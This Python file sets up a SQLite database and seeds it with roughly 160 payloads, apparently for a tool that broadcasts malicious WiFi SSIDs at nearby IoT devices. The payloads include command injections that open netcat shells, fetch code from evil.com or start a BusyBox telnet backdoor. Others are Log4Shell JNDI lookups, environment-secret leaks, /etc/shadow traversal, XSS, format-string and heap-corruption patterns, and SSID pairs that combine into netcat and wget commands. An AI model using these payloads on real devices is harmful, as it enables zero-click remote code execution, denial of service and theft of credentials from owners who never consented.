import sqlite3
from pathlib import Path

DB_PATH = Path(__file__).resolve().parent / "ciw.db"

SCHEMA_SQL = """
CREATE TABLE IF NOT EXISTS payloads (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    text        TEXT NOT NULL,
    category    TEXT NOT NULL DEFAULT 'custom',
    description TEXT NOT NULL DEFAULT '',
    created_at  TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE INDEX IF NOT EXISTS idx_payloads_category ON payloads(category);

CREATE TABLE IF NOT EXISTS results (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    payload_id  INTEGER NOT NULL REFERENCES payloads(id) ON DELETE CASCADE,
    device_name TEXT NOT NULL,
    device_mac  TEXT NOT NULL DEFAULT '',
    status      TEXT NOT NULL,
    notes       TEXT NOT NULL DEFAULT '',
    tested_at   TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE INDEX IF NOT EXISTS idx_results_device ON results(device_name);
CREATE INDEX IF NOT EXISTS idx_results_payload ON results(payload_id);

CREATE TABLE IF NOT EXISTS serial_log (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    line        TEXT NOT NULL,
    received_at TEXT NOT NULL DEFAULT (datetime('now'))
);
"""

DEFAULT_PAYLOADS = [
    # =========================================================================
    # WIFI SSID — Command Injection (20 payloads)
    # Core zero-click attack: SSID parsed as shell input by vulnerable firmware
    # =========================================================================
    ('|reboot|',             'wifi_cmd',  'Pipe operator reboot'),
    ('&reboot&',             'wifi_cmd',  'Ampersand command chain'),
    ('`reboot`',             'wifi_cmd',  'Backtick command substitution'),
    ('$reboot$',             'wifi_cmd',  'Dollar-sign variable expansion'),
    (';reboot;',             'wifi_cmd',  'Semicolon command separator'),
    ('$(reboot)',            'wifi_cmd',  'Subshell command substitution'),
    ('|shutdown -r|',        'wifi_cmd',  'Pipe with shutdown'),
    ('&cat /etc/passwd',     'wifi_cmd',  'Ampersand passwd read'),
    ('reboot\nreboot',      'wifi_cmd',  'Newline command injection'),
    ('reboot\r\nreboot',    'wifi_cmd',  'CRLF command injection'),
    ('|../../bin/sh|',       'wifi_cmd',  'Path traversal to shell'),
    ('${IFS}reboot',         'wifi_cmd',  'IFS variable separator'),
    ('*;reboot',             'wifi_cmd',  'Glob with command chain'),
    ('$(echo reboot|sh)',    'wifi_cmd',  'Echo piped to shell'),
    ('reboot\x00ignored',   'wifi_cmd',  'Null byte truncation'),
    ('|nc -lp 4444 -e sh|', 'wifi_cmd',  'Netcat reverse shell via pipe'),
    ('&wget evil.com/x&',   'wifi_cmd',  'Download + execute via ampersand'),
    ('$(curl evil.com)',     'wifi_cmd',  'Curl fetch via subshell'),
    ('|id>/tmp/pwn|',        'wifi_cmd',  'Write id output to file'),
    ('\x00|reboot|',         'wifi_cmd',  'Null-prefix command injection'),

    # =========================================================================
    # WIFI SSID — Overflow / Fuzzing (26 payloads)
    # SSID max is 32 bytes per IEEE 802.11 — test parser boundary handling
    # Includes 64-byte and 128-byte payloads targeting fixed-size buffers
    # =========================================================================

    # --- 32-byte boundary (IEEE 802.11 SSID max) ---
    ('A' * 32,               'wifi_overflow',  '32-byte max SSID fill'),
    ('A' * 31 + '\x00',     'wifi_overflow',  'Null-terminated at boundary'),
    ('\x7f' * 32,            'wifi_overflow',  '0x7F DEL fill (32 bytes, single-byte safe)'),
    ('\x00' * 32,            'wifi_overflow',  'All null bytes'),
    ('A' * 16 + '\x00' * 16, 'wifi_overflow', 'Half-null padding'),
    ('A' * 30 + '\r\n',     'wifi_overflow',  'CRLF at boundary'),
    ('\x41' * 32,            'wifi_overflow',  'Hex 0x41 fill (32 bytes)'),
    ('\x7e\x7f' * 16,        'wifi_overflow',  'Tilde+DEL alternating (32 bytes)'),
    ('\x01' * 32,            'wifi_overflow',  'SOH control byte fill (32 bytes)'),
    ('A' * 31 + '\x7f',     'wifi_overflow',  'DEL char at boundary'),

    # --- 64-byte boundary (common embedded buffer: char ssid[64]) ---
    ('A' * 64,               'wifi_overflow',  '64-byte buffer fill'),
    ('A' * 63 + '\x00',     'wifi_overflow',  '64-byte null-terminated boundary'),
    ('\x7f' * 64,            'wifi_overflow',  '64-byte 0x7F DEL fill'),
    ('\x00' * 64,            'wifi_overflow',  '64-byte all null bytes'),
    ('A' * 32 + '\x00' * 32, 'wifi_overflow', '64-byte half-null after SSID max'),
    ('A' * 33,               'wifi_overflow',  '33-byte off-by-one past SSID max'),
    ('\x41' * 60 + '\r\n\r\n', 'wifi_overflow', '64-byte CRLF at boundary'),
    ('A' * 48 + '%n' * 8,   'wifi_overflow',  '64-byte overflow + format write'),

    # --- 128-byte boundary (larger buffers: char buf[128], stack frames) ---
    ('A' * 128,              'wifi_overflow',  '128-byte buffer fill'),
    ('A' * 127 + '\x00',    'wifi_overflow',  '128-byte null-terminated boundary'),
    ('\x7f' * 128,           'wifi_overflow',  '128-byte 0x7F DEL fill'),
    ('\x00' * 128,           'wifi_overflow',  '128-byte all null bytes'),
    ('A' * 64 + '\x00' * 64, 'wifi_overflow', '128-byte half-null split'),
    ('A' * 124 + 'DEAD',    'wifi_overflow',  '128-byte fill + canary marker'),
    ('\x41' * 120 + '\x01\x02\x03\x04\x7f\x7f\x7f\x7f',
                             'wifi_overflow',  '128-byte sled + address overwrite'),
    ('A' * 65,               'wifi_overflow',  '65-byte off-by-one past 64-byte buf'),

    # =========================================================================
    # WIFI SSID — Format String (15 payloads)
    # Targets C/C++ printf-family in firmware that logs/stores SSID via printf
    # =========================================================================
    ('%s%s%s%s%s',           'wifi_fmt',  'String format crash'),
    ('%n%n%n%n',             'wifi_fmt',  'Write format exploit'),
    ('%x%x%x%x',            'wifi_fmt',  'Hex format stack leak'),
    ('%p%p%p%p',             'wifi_fmt',  'Pointer format stack leak'),
    ('%d%d%d%d%d%d',         'wifi_fmt',  'Integer format stack read'),
    ('AAAA%08x%08x%08x',    'wifi_fmt',  'Stack canary probe'),
    ('%s' * 10,              'wifi_fmt',  'Deep string deref crash'),
    ('%x' * 16,              'wifi_fmt',  'Format + overflow hybrid'),
    ('%08x.' * 4,            'wifi_fmt',  'Padded hex stack walk'),
    ('%n' * 8,               'wifi_fmt',  'Multiple write exploit'),
    ('%hn%hn%hn%hn',         'wifi_fmt',  'Short write exploit'),
    ('%1$s%2$s%3$s',         'wifi_fmt',  'Positional parameter access'),
    ('%1$n%2$n',             'wifi_fmt',  'Positional write exploit'),
    ('%.9999d',              'wifi_fmt',  'Width overflow DoS'),
    ('%c' * 32,              'wifi_fmt',  'Char format stack dump'),

    # =========================================================================
    # WIFI SSID — Probe/Deauth (10 payloads)
    # Malformed SSIDs targeting WiFi stack parsing (802.11 frame handling)
    # =========================================================================
    ('',                     'wifi_probe',  'Empty SSID (hidden network)'),
    (' ',                    'wifi_probe',  'Single space SSID'),
    ('\x00' * 1,             'wifi_probe',  'Single null byte SSID'),
    ('\x01' * 32,            'wifi_probe',  'Control chars fill'),
    ('\t\n\r' * 10,          'wifi_probe',  'Whitespace control chars'),
    ('\xe2\x80\x8b' * 10,   'wifi_probe',  'Zero-width spaces (Unicode)'),
    ('A' * 31 + '\xff',     'wifi_probe',  'Trailing invalid byte'),
    ('\x00HIDDEN\x00NET',   'wifi_probe',  'Null-embedded SSID'),
    ('\xef\xbb\xbfSSID',    'wifi_probe',  'UTF-8 BOM prefix'),
    ('\\\\\\\\\\\\\\\\',    'wifi_probe',  'Escape sequence flood'),

    # =========================================================================
    # ADVANCED — Terminal/Log Escape Injection (8 payloads)
    # SSID logged to serial/syslog/terminal → ANSI codes execute in viewer
    # Novel: no public SSID research targets terminal escape injection
    # =========================================================================
    ('\x1b[2J\x1b[HPWNED',          'wifi_esc',  'Clear screen + cursor home hijack'),
    ('\x1b]2;HACKED\x07',           'wifi_esc',  'Set terminal title via OSC'),
    ('\x1b[6n',                      'wifi_esc',  'Cursor position report → stdin inject'),
    ('\x1b[?1049h',                  'wifi_esc',  'Switch to alt screen buffer'),
    ('\x1b[31mCRITICAL\x1b[0m',     'wifi_esc',  'Red colored fake log entry'),
    ('\r\x1b[K[OK] All normal',     'wifi_esc',  'Overwrite log line with fake status'),
    ('\n[root] shutdown -h now\n',   'wifi_esc',  'Fake root log line injection'),
    ('\x1b[8mHIDDEN_PAYLOAD',        'wifi_esc',  'Hidden text mode (invisible in logs)'),

    # =========================================================================
    # ADVANCED — Serialization/Config Injection (8 payloads)
    # IoT firmware stores SSIDs in JSON/XML/INI/SQLite config files
    # Novel: targets data-at-rest parsing, not runtime shell execution
    # =========================================================================
    ('","cmd":"reboot"}',            'wifi_serial',  'JSON key injection close+inject'),
    ('</n><cmd>reboot</cmd>',        'wifi_serial',  'XML tag escape + inject'),
    ("'; DROP TABLE wifi;--",        'wifi_serial',  'SQLite injection via SSID storage'),
    ('\\",\\"admin\\":true,\\"x\\":\\"', 'wifi_serial', 'JSON privilege escalation'),
    ('key=val\nroot=true',           'wifi_serial',  'INI/env file newline injection'),
    ('{{reboot}}',                   'wifi_serial',  'Jinja/Mustache template injection'),
    ('#{system("reboot")}',          'wifi_serial',  'ERB/Ruby template injection'),
    ('${7*7}',                       'wifi_serial',  'SSTI expression evaluation'),

    # =========================================================================
    # ADVANCED — Encoding & Normalization Attacks (8 payloads)
    # Unicode fullwidth chars normalize to ASCII shell metacharacters
    # Novel: bypasses ASCII-only input filters via Unicode normalization
    # =========================================================================
    ('\uff04(reboot)',               'wifi_enc',  'Fullwidth $ → ASCII $ normalization'),
    ('\uff5creboot\uff5c',           'wifi_enc',  'Fullwidth | pipe normalization'),
    ('\uff1breboot\uff1b',           'wifi_enc',  'Fullwidth ; semicolon normalization'),
    ('%7Creboot%7C',                 'wifi_enc',  'URL-encoded pipe (HTTP parser decode)'),
    ('%24(reboot)',                   'wifi_enc',  'URL-encoded $ subshell'),
    ('\\u0060reboot\\u0060',         'wifi_enc',  'JSON Unicode-escaped backtick'),
    ('&#124;reboot&#124;',           'wifi_enc',  'HTML entity pipe (web UI render)'),
    ('\xc0\xafreboot',               'wifi_enc',  'Overlong UTF-8 slash (path bypass)'),

    # =========================================================================
    # ADVANCED — Multi-SSID Chain Attacks (8 payloads)
    # Individual SSIDs look harmless; consecutive SSIDs form complete payload
    # Novel: exploits scan-result concatenation in device WiFi managers
    # Pairs: odd=part1, even=part2 (broadcast sequentially)
    # =========================================================================
    ('$(cat /et',                    'wifi_chain',  'Chain 1/2: split subshell open'),
    ('c/passwd)',                     'wifi_chain',  'Chain 2/2: split subshell close'),
    ('|nc 10.0.',                    'wifi_chain',  'Chain 1/2: split netcat addr'),
    ('0.1 4444|',                    'wifi_chain',  'Chain 2/2: split netcat port'),
    ('%s%s%s%s',                     'wifi_chain',  'Chain 1/2: format leak phase'),
    ('%n%n%n%n',                     'wifi_chain',  'Chain 2/2: format write phase'),
    ('; wget http:/',                'wifi_chain',  'Chain 1/2: split wget URL'),
    ('/evil.com/x ;',                'wifi_chain',  'Chain 2/2: split wget exec'),

    # =========================================================================
    # ADVANCED — Memory Corruption Primitives (8 payloads)
    # Byte patterns targeting heap/stack metadata in embedded allocators
    # Novel: not generic fuzzing — targets dlmalloc/newlib used by ESP
    # =========================================================================
    ('\x41' * 4 + '\xff\xff\xff\xff' + '\x41' * 4 + '\xff\xff\xff\xff' + '\x41' * 4 + '\xff\xff\xff\xff' + '\x41' * 4 + '\xff\xff\xff\xff',
                                     'wifi_heap',  'dlmalloc prev_size overwrite pattern'),
    ('\x00\x00\x00\x04' * 8,        'wifi_heap',  'Fake chunk size=4 (minimum alloc)'),
    ('\xef\xbe\xad\xde' * 8,        'wifi_heap',  '0xDEADBEEF canary detection probe'),
    ('\x01\x00\x00\x00' * 8,        'wifi_heap',  'Integer 1 spray (bool true confusion)'),
    ('\xff\xff\xff\x7f' * 8,        'wifi_heap',  'INT_MAX spray (integer overflow)'),
    ('\x00' * 28 + '\x41\x41\x41\x41', 'wifi_heap', 'Null sled + return addr overwrite'),
    ('\x0d\xf0\xad\xba' * 8,        'wifi_heap',  '0xBAADF00D uninitialized mem marker'),
    ('\x41\x41\x41\x41' * 7 + '\xfe\xff\xfe\xff',
                                     'wifi_heap',  'Heap spray + invalid free trigger'),

    # =========================================================================
    # WIFI SSID — XSS / Web UI Injection (8 payloads)
    # IoT web dashboards display nearby SSIDs — unsanitized = XSS
    # Targets: router admin panels, smart home hubs, WiFi survey tools
    # =========================================================================
    ('<script>alert(1)</script>',     'wifi_xss',  'Basic reflected XSS in scan results'),
    ('<img src=x onerror=alert(1)>',  'wifi_xss',  'Event handler XSS via broken image'),
    ('"><svg onload=alert(1)>',       'wifi_xss',  'Attribute breakout + SVG event XSS'),
    ('<body onload=alert(1)>',        'wifi_xss',  'Body tag event injection'),
    ('<details open ontoggle=a()>',   'wifi_xss',  'HTML5 details ontoggle event'),
    ('<iframe src=//evil.com>',       'wifi_xss',  'iFrame injection in scan UI'),
    ("'-alert(1)-'",                  'wifi_xss',  'JS string breakout in inline context'),
    ('<marquee onstart=alert(1)>',    'wifi_xss',  'Marquee event handler XSS'),

    # =========================================================================
    # WIFI SSID — Path Traversal (6 payloads)
    # Firmware using SSID in file paths (log storage, config, history)
    # Targets: embedded Linux IoT storing WiFi scan results on filesystem
    # =========================================================================
    ('../../../etc/shadow',           'wifi_path',  'Shadow file traversal'),
    ('....//....//etc/passwd',        'wifi_path',  'Double-dot filter bypass'),
    ('..%2f..%2f..%2fetc/pass',      'wifi_path',  'URL-encoded slash traversal'),
    ('/proc/self/environ',            'wifi_path',  'Process environment leak'),
    ('../..\\..\\..\\boot.ini',      'wifi_path',  'Mixed separator Windows traversal'),
    ('/dev/urandom',                  'wifi_path',  'Device file read DoS'),

    # =========================================================================
    # WIFI SSID — CRLF / HTTP Header Injection (6 payloads)
    # IoT web interfaces reflecting SSID in HTTP responses without CR/LF strip
    # Targets: captive portals, router web UIs, IoT dashboards
    # =========================================================================
    ('\r\nX-Injected: true',          'wifi_crlf',  'Custom header injection via CRLF'),
    ('%0d%0aSet-Cookie:a=1',          'wifi_crlf',  'URL-encoded cookie injection'),
    ('\r\nLocation: //evil',          'wifi_crlf',  'Redirect header injection'),
    ('%0d%0a%0d%0a<h1>XSS',          'wifi_crlf',  'Response splitting body injection'),
    ('\nTransfer-Encoding: z',        'wifi_crlf',  'Request smuggling prefix'),
    ('\r\nContent-Length: 0',         'wifi_crlf',  'Content-Length header injection'),

    # =========================================================================
    # WIFI SSID — JNDI / Expression Language (6 payloads)
    # Java-based IoT platforms that log SSIDs (Android, SmartThings, etc.)
    # Targets: Log4j, Spring EL, Thymeleaf — any Java logger ingesting SSIDs
    # =========================================================================
    ('${jndi:ldap://evil/a}',         'wifi_jndi',  'Log4Shell JNDI LDAP lookup'),
    ('${jndi:dns://evil/a}',          'wifi_jndi',  'JNDI DNS exfiltration'),
    ('${env:AWS_SECRET_KEY}',         'wifi_jndi',  'Environment variable leak via EL'),
    ('${sys:user.dir}',               'wifi_jndi',  'System property leak via EL'),
    ('${jndi:rmi://evil/a}',          'wifi_jndi',  'JNDI RMI class loading'),
    ('${{<%[%\'"}}%\\.',              'wifi_jndi',  'Polyglot template probe'),

    # =========================================================================
    # WIFI SSID — NoSQL / LDAP Injection (6 payloads)
    # IoT devices using MongoDB/CouchDB or LDAP for network storage/auth
    # Targets: enterprise IoT, network appliances, cloud-connected devices
    # =========================================================================
    ('{"$gt":""}',                    'wifi_nosql',  'MongoDB gt operator bypass'),
    ('{"$ne":null}',                  'wifi_nosql',  'MongoDB not-equal auth bypass'),
    ('{"$regex":".*"}',               'wifi_nosql',  'MongoDB regex match-all'),
    ('{"$where":"1==1"}',             'wifi_nosql',  'MongoDB server-side JS eval'),
    ('*)(uid=*))(|(uid=*',            'wifi_nosql',  'LDAP wildcard filter injection'),
    ('admin)(|(password=*',           'wifi_nosql',  'LDAP password filter bypass'),

    # =========================================================================
    # Additions to existing categories — filling gaps
    # =========================================================================

    # --- Command Injection: Windows/BusyBox/PowerShell targets ---
    ('& ping -n 3 127.0.0.1 &',      'wifi_cmd',  'Windows cmd ping injection'),
    ('|powershell -c reboot|',        'wifi_cmd',  'PowerShell command via pipe'),
    ('`busybox reboot`',              'wifi_cmd',  'BusyBox-specific reboot'),
    ('$(kill -9 1)',                   'wifi_cmd',  'Kill init process (PID 1)'),
    ('|/bin/busybox telnetd|',        'wifi_cmd',  'BusyBox telnet backdoor'),

    # --- Serialization: CSV/DDE injection + YAML deserialization ---
    ('=CMD("reboot")',                'wifi_serial',  'Excel formula command injection'),
    ('-cmd|\'/C calc\'!A0',           'wifi_serial',  'DDE minus prefix execution'),
    ('+cmd|\'/C calc\'!A0',           'wifi_serial',  'DDE plus prefix execution'),
    ('!!python/object/apply:os.system ["reboot"]'[:32],
                                      'wifi_serial',  'YAML deserialization RCE'),
    ('O:8:"Obj":1:{s:1:"x";}',       'wifi_serial',  'PHP object deserialization'),

    # --- Probe/Malformed: WiFi stack edge cases ---
    ('\u202ediSS_derewop',            'wifi_probe',  'RTL override display spoof'),
    ('DIRECT-xy-FAKEDEVICE',          'wifi_probe',  'WiFi Direct prefix spoof'),
    ('\xc0\x80' * 16,                 'wifi_probe',  'Overlong null encoding (x16)'),
    ('\xed\xa0\x80' * 10,             'wifi_probe',  'Lone surrogate codepoints'),

]


def get_db() -> sqlite3.Connection:
    conn = sqlite3.connect(str(DB_PATH))
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA foreign_keys=ON")
    return conn


def init_db():
    conn = get_db()
    conn.executescript(SCHEMA_SQL)
    conn.close()


def seed_default_payloads():
    conn = get_db()
    count = conn.execute("SELECT COUNT(*) FROM payloads").fetchone()[0]
    if count == 0:
        for text, category, description in DEFAULT_PAYLOADS:
            conn.execute(
                "INSERT INTO payloads (text, category, description) VALUES (?, ?, ?)",
                (text, category, description),
            )
        conn.commit()
    conn.close()
